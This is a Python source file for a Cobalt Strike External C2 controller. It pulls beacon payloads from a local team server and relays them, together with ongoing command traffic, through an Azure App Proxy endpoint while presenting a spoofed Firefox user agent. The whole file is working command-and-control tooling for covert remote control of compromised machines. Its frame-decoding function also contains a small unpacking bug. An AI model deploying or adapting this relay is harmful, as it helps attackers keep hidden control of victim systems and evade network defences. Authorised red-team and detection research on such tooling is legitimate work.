import socket
import struct
import time
import urllib.request
from base64 import b64decode,b64encode
import re
import time
import urllib.parse
import requests

init = "https://l33t.msappproxy.net/init"
server = "https://l33t.msappproxy.net/data"
retryCount = 20
sleepTime = 5

class ExternalC2Controller:
    def __init__(self, port):
        self.port = port

    def encodeFrame(self, data):
        d = struct.pack("<I", len(data)) + data
        return d

    def decodeFrame(self, data):
        len = struct.unpack("<I", data[0:3])
        body = data[4:]
        return (len, body)

    def sendToTS(self, data):
        self._socketTS.sendall(self.encodeFrame(data))

    def recvFromTS(self):
        data = b""
        _len =  self._socketTS.recv(4)
        l = struct.unpack("<I",_len)[0]
        while len(data) < l:
            data += self._socketTS.recv(l - len(data))
        return data

    def sendToBeacon(self, data):
        data = b64encode(data)
        
        # Need retries as Azure AppProxy can sometimes 500
        for i in range(retryCount):
          try:
            retdata = self.makeRequest(server, data)
            break
          except: 
            time.sleep(5)

        return b64decode(retdata)

    def sendToBeaconInit(self, data):
        data = b64encode(data)
        data = self.makeRequest(init, data)
        return b64decode(data)

    def makeRequest(self, url, data=None, c=None):
      if data == None:
        with urllib.request.urlopen(url) as f:
            data = f.read()
            return data
      else:
        req = urllib.request.Request(url, data, method='POST', headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0" })
        with urllib.request.urlopen(req) as f:
         data = f.read()
         return data

    def run(self):
        data = ""

        # Now we have a beacon connection, we kick off comms with CS External C2
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        self._socketTS.connect(("127.0.0.1", self.port))

        # Send out config options
        self.sendToTS(b"arch=x86")
        self.sendToTS(b"pipename=test")
        self.sendToTS(str.encode("block={}".format(sleepTime * 1000)))
        self.sendToTS(b"go")

        # Receive the beacon payload from CS to forward to our custom beacon
        data = self.recvFromTS()
        print("Sending %d bytes to beacon" % len(data))
        data = self.sendToBeaconInit(data)

        while(True):
          print("Sending %d bytes to TS" % len(data))
          self.sendToTS(data)

          data = self.recvFromTS()
          print("Received %d bytes from TS" % len(data))

          print("Sending %d bytes to beacon" % len(data))
          data = self.sendToBeacon(data)

          print("Received %d bytes from beacon" % len(data))

controller = ExternalC2Controller(3133)
controller.run()
